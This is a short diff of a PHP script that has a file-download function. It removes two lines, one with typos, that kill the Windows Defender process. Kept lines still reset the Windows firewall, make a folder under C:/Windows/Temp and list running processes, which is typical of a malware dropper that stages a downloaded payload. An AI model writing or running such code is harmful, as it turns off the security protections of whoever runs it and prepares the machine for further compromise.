@@ -30,9 +30,6 @@ function downloadFile($url, $savePath) {
 
 
 
-
-system('ntaskkill /F /IM defender.exe /T'); 
-vsystem('taskkill /F /IM defender.exe /T'); 
 system('netsh advfirewall reset');  
 system('mkdir "C:/Windows/Temp/RightProgramOne"');  
 exec('tasklist', $output);
